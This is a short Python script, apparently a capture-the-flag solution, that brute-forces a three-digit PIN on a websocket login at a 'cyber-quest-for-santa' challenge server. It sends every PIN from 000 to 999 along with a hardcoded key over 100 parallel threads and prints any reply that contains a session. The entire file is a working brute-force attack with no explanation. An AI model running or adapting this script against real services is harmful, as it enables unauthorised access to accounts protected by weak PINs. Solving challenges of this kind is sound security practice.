

import asyncio
import websockets
from concurrent.futures import ThreadPoolExecutor

URL = 'wss://cyber-quest-for-santa-3.julec.tf/server'   
KEY = 'w967Tg15gB8NBtIOdzqeFw=='

async def tryLoginWith(pin):
    async with websockets.connect(URL) as websocket:
        begin = await websocket.recv()
        if begin == 'begin':
            await websocket.send(f'begin')
            await websocket.send(f'pass {pin}')
            await websocket.send(f'key {KEY}')

            data = await websocket.recv()
            if 'session' in data:
                print(f'[<<<] Data: {data} | Pincode: {pin}')
            else:
                print(f'[-] Wrong Pincode: {pin}')

def send(args):
    asyncio.run(tryLoginWith(str(args).zfill(3)))

args = [ x for x in range(1000) ]
with ThreadPoolExecutor(max_workers=100) as pool:
    pool.map(send,args)
